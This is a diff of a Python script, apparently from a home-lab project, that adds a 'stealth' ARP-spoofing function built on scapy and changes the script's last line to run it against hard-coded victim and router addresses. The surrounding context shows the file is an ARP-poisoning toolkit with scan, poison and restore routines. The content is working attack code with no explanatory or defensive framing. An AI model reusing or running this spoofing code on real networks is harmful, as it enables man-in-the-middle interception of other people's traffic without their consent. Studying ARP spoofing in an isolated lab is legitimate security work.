@@ -76,6 +76,13 @@ def arpRestore(victimIP, victimMAC, routerIP, routerMAC):
     scapy.all.send(scapy.all.ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4)
     scapy.all.send(scapy.all.ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)
 
+
+def arpSpoofStealth(victimIP, victimMAC, routerIP, routerMAC):
+    interface = scapy.all.get_working_if()
+    attackerMAC = scapy.all.get_if_hwaddr(interface)
+
+    scapy.all.send(scapy.all.ARP(op=1, hwsrc=attackerMAC, psrc=routerIP, hwdst=victimMAC, pdst=victimIP))
+    #scapy.all.send(scapy.all.ARP(op=1, hwsrc=attackerMAC, psrc="192.168.56.1", hwdst="00:00:00:00:00:00", pdst="192.168.56.101"))
 # i = 0
 # while i < 20:
 #     arpSpoof('192.168.56.101', '08:00:27:B0:A1:AB', '192.168.56.1', '0a:00:27:00:00:13')
@@ -102,4 +109,4 @@ def arpPoisonStealthy(victimIP, victimMAC, routerIP, routerMAC):
 # arpRestore('192.168.56.101', '08:00:27:B0:A1:AB', '192.168.56.1', '0a:00:27:00:00:13')
 # scan("192.168.56.0/24", "enp0s3")
 
-#arpPoisonStealthy('192.168.56.101', '08:00:27:B0:A1:AB', '192.168.56.1', '0a:00:27:00:00:13')
+arpSpoofStealth('192.168.56.101', '08:00:27:B0:A1:AB', '192.168.56.1', '0a:00:27:00:00:13')
